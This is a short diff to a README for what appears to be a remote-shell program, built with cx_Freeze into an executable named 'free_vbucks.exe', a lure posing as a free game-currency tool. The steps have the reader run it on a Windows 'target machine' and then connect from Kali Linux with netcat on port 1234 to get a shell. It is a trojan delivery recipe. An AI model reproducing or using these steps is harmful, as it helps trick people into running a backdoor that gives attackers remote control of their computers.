@@ -6,7 +6,7 @@ run "pip install cx_Freeze" in your terminal
 
 How it works:
 
-1. Open your code editor (or cmd) and run "python setup.py build" in the terminal
+1. Open your code editor (or cmd) and run "python setup.py build" in the terminal and a "Build" folder should be generated
 2. Open the folder inside the "Build" folder and run the "free_vbucks.exe" in your Windows system
 3. Try "nc [your-windows-IP] 1234" on another machine (i.e. Kali Linux)
 4. You should be able to spawn a shell on your target machine
